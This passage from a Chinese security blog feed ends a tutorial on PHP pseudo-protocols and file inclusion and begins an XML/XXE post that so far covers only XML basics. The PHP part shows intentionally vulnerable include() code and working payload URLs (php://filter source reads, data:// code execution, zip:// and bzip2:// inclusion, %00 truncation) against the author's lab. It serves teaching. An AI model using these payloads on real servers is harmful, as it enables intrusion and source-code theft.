class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;convert.quoted-printable-decode&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\nquoted-printable-decode:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.=0A&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524201145738.png" alt="image-20200524201145738"></p><h4 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h4><p><strong>zlib.deflate和 zlib.inflate</strong></p><blockquote><p>zlib.deflate（压缩）和 zlib.inflate（解压）实现了定义与 » RFC 1951的压缩算法。 deflate过滤器可以接受以一个关联数组传递的最多三个参数。 level定义了压缩强度（1-9）。数字更高通常会产生更小的载荷，但要消耗更多的处理时间。存在两个特殊压缩等级：0（完全不压缩）和 -1（zlib 内部默认值，目前是 6）。 window是压缩回溯窗口大小，以二的次方表示。更高的值（大到 15 —— 32768 字节）产生更好的压缩效果但消耗更多内存，低的值（低到 9 —— 512 字节）产生产生较差的压缩效果但内存消耗低。目前默认的 window大小是 15。 memory用来指示要分配多少工作内存。合法的数值范围是从 1（最小分配）到 9（最大分配）。内存分配仅影响速度，不会影响生成的载荷的大小。<br>Note: 因为最常用的参数是压缩等级，也可以提供一个整数值作为此参数（而不用数组）。</p></blockquote><p><strong>bzip2.compress和 bzip2.decompress</strong></p><blockquote><p>bzip2.compress过滤器接受以一个关联数组给出的最多两个参数：blocks是从 1 到 9 的整数值，指定分配多少个 100K 字节的内存块作为工作区。 work是 0 到 250 的整数值，指定在退回到一个慢一些，但更可靠的算法之前做多少次常规压缩算法的尝试。调整此参数仅影响到速度，压缩输出和内存使用都不受此设置的影响。将此参数设为 0 指示 bzip 库使用内部默认算法。 bzip2.decompress过滤器仅接受一个参数，可以用普通的布尔值传递，或者用一个关联数组中的small单元传递。当small设为&true; 值时，指示 bzip 库用最小的内存占用来执行解压缩，代价是速度会慢一些。</p></blockquote><h4 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h4><p>_mcrypt.<em>_和 _mdecrypt.</em>_使用 libmcrypt 提供了对称的加密和解密。这两组过滤器都支持 mcrypt 扩展库中相同的算法，格式为_mcrypt.ciphername_，其中 ciphername是密码的名字，将被传递给 mcrypt_module_open()。有以下五个过滤器参数可用：</p><p>mcrypt 过滤器参数</p><table><thead><tr><th align="center">参数</th><th align="center">是否必须</th><th align="center">默认值</th><th align="center">取值举例</th><th></th><th></th></tr></thead><tbody><tr><td align="center">mode</td><td align="center">可选</td><td align="center">cbc</td><td align="center">cbc, cfb, ecb, nofb, ofb, stream</td><td></td><td></td></tr><tr><td align="center">algorithms_dir</td><td align="center">可选</td><td align="center">ini_get(‘mcrypt.algorithms_dir’)</td><td align="center">algorithms 模块的目录</td><td></td><td></td></tr><tr><td align="center">modes_dir</td><td align="center">可选</td><td align="center">ini_get(‘mcrypt.modes_dir’)</td><td align="center">modes 模块的目录</td><td></td><td></td></tr><tr><td align="center">iv</td><td align="center">必选</td><td align="center">N&#x2F;A</td><td align="center">典型为 8，16 或 32 字节的二进制数据。根据密码而定</td><td></td><td></td></tr><tr><td align="center">key</td><td align="center">必选</td><td align="center">N&#x2F;A</td><td align="center">典型为 8，16 或 32 字节的二进制数据。根据密码而定</td><td></td><td></td></tr></tbody></table><p><strong>举例</strong></p><p>phpinfo.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];  </span><br><span class="line"><span class="variable">$data</span>=<span class="string">&quot;test test&quot;</span>;  </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p><a href="http://www.w3school.com.cn/php/func_filesystem_file_put_contents.asp">PHP file_put_contents() 函数</a></p><p>payload：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lab.l0ki.top/phpinfo.php?a=php://filter/write=string.tolower/resource=test.php</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524202850271.png" alt="image-20200524202850271"></p><p>以base64的方式显示:</p><p>方法一:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p><a href="http://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp">PHP file_get_contents() 函数</a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lab.l0ki.top/phpinfo.php?a=php://filter/convert.base64-encode/resource=test.php</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524203309946.png" alt="image-20200524203309946"></p><p>方法二：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span>=<span class="string">&quot;test test&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;<span class="subst">$filename</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab.l0ki.top/phpinfo.php?a=php://filter/convert.base64-encode/resource=test.php</span><br></pre></td></tr></table></figure><p><strong>双引号包含的变量$filename会被当作正常变量执行，而单引号包含的变量则会被当作字符串执行。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$aa</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$aa</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$aa&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-c75f4f31529e55fc.png" alt="图片.png"></p><h3 id="0x003-data-协议"><a href="#0x003-data-协议" class="headerlink" title="0x003 data:&#x2F;&#x2F;协议"></a>0x003 data:&#x2F;&#x2F;协议</h3><p>data:资源类型;编码,内容<br>数据流封装器<br>当allow_url_include 打开的时候，任意文件包含就会成为任意命令执行</p><p>经过测试官方文档上存在一处问题，经过测试PHP版本5.2，5.3，5.5，7.0；data:&#x2F;&#x2F; 协议是是受限于allow_url_fopen的，官方文档上给出的是NO，所以要使用data:&#x2F;&#x2F;协议需要满足双on条件</p><blockquote><p>PHP.ini：<br>data:&#x2F;&#x2F;协议必须双在on才能正常使用；<br>allow_url_fopen ：on<br>allow_url_include：on<br>php 版本大于等于 php5.2</p></blockquote><p><strong>实例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">include $_GET[&#x27;file&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://lab.l0ki.top/cmd.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">http://lab.l0ki.top/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524230916588.png" alt="image-20200524230916588"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524231000042.png" alt="image-20200524231000042"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://lab.l0ki.top/cmd.php?file=data:text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">http://lab.l0ki.top/cmd.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524231107445.png" alt="image-20200524231107445"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524231147053.png" alt="image-20200524231147053"></p><h3 id="0x004-zip-bzip2-zlib-协议"><a href="#0x004-zip-bzip2-zlib-协议" class="headerlink" title="0x004 zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议"></a>0x004 zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议</h3><p>PHP.ini：</p><blockquote><p>zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议在双off的情况下也可以正常使用:<br>allow_url_fopen ：off&#x2F;on<br>allow_url_include：off&#x2F;on</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3个封装协议，都是直接打开压缩文件。</span><br><span class="line">compress.zlib://file.gz - 处理的是 &#x27;.gz&#x27; 后缀的压缩包</span><br><span class="line">compress.bzip2://file.bz2 - 处理的是 &#x27;.bz2&#x27; 后缀的压缩包</span><br><span class="line">zip://archive.zip#dir/file.txt - 处理的是 &#x27;.zip&#x27; 后缀的压缩包里的文件</span><br></pre></td></tr></table></figure><p><strong>zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</strong></p><h3 id="0x005-zip-协议"><a href="#0x005-zip-协议" class="headerlink" title="0x005 zip:&#x2F;&#x2F;协议"></a>0x005 zip:&#x2F;&#x2F;协议</h3><p>php 版本大于等于 php5.3.0<br>使用方法：<br><code>zip://archive.zip#dir/file.txt</code><br><strong>zip:&#x2F;&#x2F; [压缩文件绝对路径]#[压缩文件内的子文件名]</strong><br><strong>要用绝对路径+#(url编码,即为%23)</strong></p><p><strong>实例</strong></p><p>payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab.l0ki.top/cmd.php?file=zip:///www/wwwroot/lab.l0ki.top/file.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure><ul><li>先创建一个phpinfo.txt文件,写入代码<code>&lt;?php phpinfo();?&gt;</code>  </li><li>再将这个文件压缩为file.zip进行上传</li><li><strong>若报错或上传失败，则将file.zip重命名为file.jpg即可</strong></li></ul><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524232610258.png" alt="image-20200524232610258"></p><blockquote><p>由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径。</p></blockquote><h3 id="0x006-bzip2-协议"><a href="#0x006-bzip2-协议" class="headerlink" title="0x006 bzip2:&#x2F;&#x2F;协议"></a>0x006 bzip2:&#x2F;&#x2F;协议</h3><p><strong>使用方法：</strong></p><p><code>compress.bzip2://file.bz2</code></p><p>相对路径也可以</p><p><strong>实例</strong></p><p>用7-zip生成一个bz2压缩文件。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://lab.l0ki.top/cmd.php?file=compress.bzip2:///www/wwwroot/lab.l0ki.top/file.jpg</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">http://lab.l0ki.top/cmd.php?file=compress.bzip2://./file.jpg</span><br></pre></td></tr></table></figure><h3 id="0x007-zlib-协议"><a href="#0x007-zlib-协议" class="headerlink" title="0x007 zlib:&#x2F;&#x2F;协议"></a>0x007 zlib:&#x2F;&#x2F;协议</h3><p><strong>使用方法：</strong></p><p><code>compress.zlib://file.gz</code></p><h2 id="0x02-文件包含漏洞"><a href="#0x02-文件包含漏洞" class="headerlink" title="0x02 文件包含漏洞"></a>0x02 文件包含漏洞</h2><h3 id="0x001-文件包含漏洞简介"><a href="#0x001-文件包含漏洞简介" class="headerlink" title="0x001 文件包含漏洞简介"></a>0x001 文件包含漏洞简介</h3><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p><p>说白了就是引用一个文件。</p><h3 id="0x002-文件包含函数"><a href="#0x002-文件包含函数" class="headerlink" title="0x002 文件包含函数"></a>0x002 文件包含函数</h3><blockquote><p>文件包含函数：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file 。</p></blockquote><blockquote><p>常见的文件包含函数：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file，</p></blockquote><p><code>include</code>和<code>require</code>区别主要是，<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p><p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p><h3 id="0x003-漏洞产生原因"><a href="#0x003-漏洞产生原因" class="headerlink" title="0x003 漏洞产生原因"></a>0x003 漏洞产生原因</h3><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p><p>示例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>例如：</p><p><code>$_GET[&#39;filename&#39;]</code>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[&#39;filename&#39;]</code>的值，执行非预期的操作。</p><h3 id="0x004-两种问题"><a href="#0x004-两种问题" class="headerlink" title="0x004 两种问题"></a>0x004 两种问题</h3><p><strong>是否截断问题:</strong></p><p>情况一：不需要截断：</p><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?file=file:///c:/users/Thinking/desktop/flag.txt</span><br></pre></td></tr></table></figure><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>情况二：需要截断：</p><p>在php版本&lt;&#x3D;5.2中进行测试是可以使用%00截断的。</p><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?file=file:///c:/users/Thinking/desktop/flag.txt%00</span><br></pre></td></tr></table></figure><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].’.php’)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>allow_url_fopen与allow_url_include是否开启问题</strong></p><p>则追溯于以上的各种相关协议</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&fps=1">php 伪协议</a></p><p><a href="http://www.freebuf.com/column/148886.html">php伪协议实现命令执行的七种姿势</a></p><p><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">Smi1e</a></p><p><a href="https://www.freebuf.com/articles/web/182280.html">Web安全实战系列：文件包含漏洞</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>From Basics to Attack: XML Entity Injection</title>
      <link href="/2020/05/20/From-Basics-to-Attack-XML-Entity-Injection/"/>
      <url>/2020/05/20/From-Basics-to-Attack-XML-Entity-Injection/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>XXE是一种非常常见的漏洞类型，通常在web应用渗透中，成功利用的几率大。</p><p>本文主要从基础知识入手，引入重点，难点，误区，解决方法，实验方法，攻击方法，防御方法。</p><h2 id="0x02-XML"><a href="#0x02-XML" class="headerlink" title="0x02 XML"></a>0x02 XML</h2><h4 id="0x001-简介"><a href="#0x001-简介" class="headerlink" title="0x001 简介"></a>0x001 简介</h4><p><strong>XML 被设计用来结构化、存储以及传输信息。</strong></p><p><strong>HTML 被设计用来显示数据。</strong></p><h6 id="什么是-XML"><a href="#什么是-XML" class="headerlink" title="什么是 XML?"></a>什么是 XML?</h6><ul><li>XML 指可扩展标记语言（<em>EX</em>tensible <em>M</em>arkup <em>L</em>anguage）</li><li>XML 是一种<em>标记语言</em>，很类似 HTML</li><li>XML 的设计宗旨是<em>传输数据</em>，而非显示数据</li><li>XML 标签没有被预定义。您需要<em>自行定义标签</em>。</li><li>XML 被设计为具有<em>自我描述性</em>。</li><li>XML 是 <em>W3C 的推荐标准</em></li></ul><h6 id="XML-与-HTML-的主要差异"><a href="#XML-与-HTML-的主要差异" class="headerlink" title="XML 与 HTML 的主要差异"></a>XML 与 HTML 的主要差异</h6><ul><li>XML 不是 HTML 的替代。</li><li>XML 和 HTML 为不同的目的而设计：</li><li>XML 被设计为传输和存储数据，其焦点是数据的内容。</li><li>HTML 被设计用来显示数据，其焦点是数据的外观。</li><li>HTML 旨在显示信息，而 XML 旨在传输信息。</li><li>XML中的空格会被保留</li><li>XML的注释和HTML一样</li></ul><h6 id="对XML的特点的理解"><a href="#对XML的特点的理解" class="headerlink" title="对XML的特点的理解"></a>对XML的特点的理解</h6><p>不作为，纯文本，自定义</p><blockquote><p>xml文档仅仅是包装在 XML 标签中的纯粹的信息</p><p>我们需要编写软件或者程序，才能传送、接收和显示出这个文档</p><p>xml标签的功能性意义依赖于应用程序</p><p>在 HTML 中使用的标签（以及 HTML 的结构）是预定义的</p><p>XML中允许创作者定义自己的标签和自己的文档结构</p></blockquote><h6 id="XML用途"><a href="#XML用途" class="headerlink" title="XML用途"></a>XML用途</h6><ul><li><strong>XML 应用于 web 开发的许多方面，常用于简化数据的存储和共享。</strong></li><li><strong>XML 把数据从 HTML 分离</strong></li><li><strong>简化数据共享、数据传输、平台的变更</strong></li></ul><h4 id="0x002-树结构"><a href="#0x002-树结构" class="headerlink" title="0x002 树结构"></a>0x002 树结构</h4><p><strong>XML 文档形成了一种树结构，它从“根部”开始，然后扩展到“枝叶”。</strong></p><h6 id="文档实例"><a href="#文档实例" class="headerlink" title="文档实例"></a>文档实例</h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第一行是 XML 声明。它定义 XML 的版本 (1.0) 和所使用的编码 (ISO-8859-1 &#x3D; Latin-1&#x2F;西欧字符集)。</p><p>下一行描述文档的<em>根元素</em>（像在说：“本文档是一个便签”）：<code>&lt;note&gt;</code></p><p>接下来 4 行描述根的 4 个<em>子元素</em>（to, from, heading 以及 body）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后一行定义根元素的结尾：<code>&lt;/note&gt;</code></p><h6 id="文档形成树结构"><a href="#文档形成树结构" class="headerlink" title="文档形成树结构"></a>文档形成树结构</h6><p>XML 文档必须包含<em>根元素</em>。该元素是所有其他元素的父元素。</p><p>XML 文档中的元素形成了一棵文档树。这棵树从根部开始，并扩展到树的最底端。</p><p>所有元素均可拥有子元素：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">child</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">subchild</span>&gt;</span>.....<span class="tag">&lt;/<span class="name">subchild</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>父、子以及同胞等术语用于描述元素之间的关系。父元素拥有子元素。相同层级上的子元素成为同胞（兄弟或姐妹）。</p><p>所有元素均可拥有文本内容和属性（类似 HTML 中）。</p><h6 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/ct_nodetree1.gif" alt="img"></p><p>上图表示下面的 XML 中的一本书：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;bookstore&gt;</span><br><span class="line">&lt;book category=&quot;COOKING&quot;&gt;</span><br><span class="line">  &lt;title lang=&quot;en&quot;&gt;Everyday Italian&lt;/title&gt; </span><br><span class="line">  &lt;author&gt;Giada De Laurentiis&lt;/author&gt; </span><br><span class="line">  &lt;year&gt;2005&lt;/year&gt; </span><br><span class="line">  &lt;price&gt;30.00&lt;/price&gt; </span><br><span class="line">&lt;/book&gt;</span><br><span class="line">&lt;book category=&quot;CHILDREN&quot;&gt;</span><br><span class="line">  &lt;title lang=&quot;en&quot;&gt;Harry Potter&lt;/title&gt; </span><br><span class="line">  &lt;author&gt;J K. Rowling&lt;/author&gt; </span><br><span class="line">  &lt;year&gt;2005&lt;/year&gt; </span><br><span class="line">  &lt;price&gt;29.99&lt;/price&gt; </span><br><span class="line">&lt;/book&gt;</span><br><span class="line">&lt;book category=&quot;WEB&quot;&gt;</span><br><span class="line">  &lt;title lang=&quot;en&quot;&gt;Learning XML&lt;/title&gt; </span><br><span class="line">  &lt;author&gt;Erik T. Ray&lt;/author&gt; </span><br><span class="line">  &lt;year&gt;2003&lt;/year&gt; </span><br><span class="line">  &lt;price&gt;39.95&lt;/price&gt; </span><br><span class="line">&lt;/book&gt;</span><br><span class="line">&lt;/bookstore&gt;</span><br></pre></td></tr></table></figure><p>例子中的根元素是 <code>&lt;bookstore&gt;</code>。文档中的所有 <code>&lt;book&gt;</code> 元素都被包含在 <code>&lt;bookstore&gt;</code> 中。</p><p><code>&lt;book&gt;</code> 元素有 4 个子元素：<code>&lt;title&gt;</code>、<code>&lt; author&gt;</code>、<code>&lt;year&gt;</code>、<code>&lt;price&gt;</code>。</p><h4 id="0x003-语法"><a href="#0x003-语法" class="headerlink" title="0x003 语法"></a>0x003 语法</h4><p><strong>禁忌</strong></p><ul><li>所有 XML 元素都须有关闭标签</li><li>XML 标签对大小写敏感</li><li>XML 必须正确地嵌套</li><li>XML 文档必须有根元素</li><li>XML 的属性值须加引号</li></ul><h4 id="0x004-实体引用"><a href="#0x004-实体引用" class="headerlink" title="0x004 实体引用"></a>0x004 实体引用</h4><p>在 XML 中，一些字符拥有特殊的意义。</p><p>如果你把字符 “&lt;” 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。</p><p>这样会产生 XML 错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>为了避免这个错误，请用<em>实体引用</em>来代替 “&lt;” 字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt; </span><br></pre></td></tr></table></figure><p>在 XML 中，有 5 个预定义的实体引用：</p><table><thead><tr><th>&lt;</th><th>&lt;</th><th>小于</th></tr></thead><tbody><tr><td>&gt;</td><td>&gt;</td><td>大于</td></tr><tr><td>&amp;</td><td>&amp;</td><td>和号</td></tr><tr><td>&apos;</td><td>‘</td><td>单引号</td></tr><tr><td>&quot;</td><td>“</td><td>引号</td></tr></tbody></table><p><strong>注释：</strong>在 XML 中，只有字符 “&lt;” 和 “&amp;” 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。</p><h2 id="0x03-DTD"><a href="#0x03-DTD" class="headerlink" title="0x03 DTD"></a>0x03 DTD</h2><h4 id="0x001-简介-1"><a href="#0x001-简介-1" 